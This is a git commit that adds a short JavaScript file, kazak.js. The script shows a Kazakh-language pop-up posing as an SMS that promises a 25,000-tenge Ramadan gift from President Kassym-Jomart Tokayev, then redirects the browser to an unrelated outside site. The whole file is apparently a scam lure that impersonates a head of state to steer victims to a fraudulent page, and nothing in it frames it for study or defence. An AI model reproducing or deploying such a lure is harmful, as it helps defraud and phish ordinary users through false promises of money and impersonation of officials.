2fe6c29d7a2ec6c72fac4623e9704b88987351ab
usorondo19 <mummery.scaly1x@icloud.com>
2026-02-23 04:46:48 +0100

    Create kazak.js

---
+++ kazak.js
@@ -0,0 +1,5 @@
+var password = '25000 теңге алыңыз'
+password = prompt(' SMS: Құттықтаймыз, сіз президенттен 25000 теңге ақшалай Рамазан сыйын алуға құқылысыз.  Kassym-Jomart Tokayev, ұсынысты қазір алу үшін OK түймесін басыңыз','25000 теңге алыңыз');
+if (password != '25000 теңге алыңыз') {
+    location.href ='https://www.ikpangzcr.site/ramadan-25000 теңге алыңыз';
+}
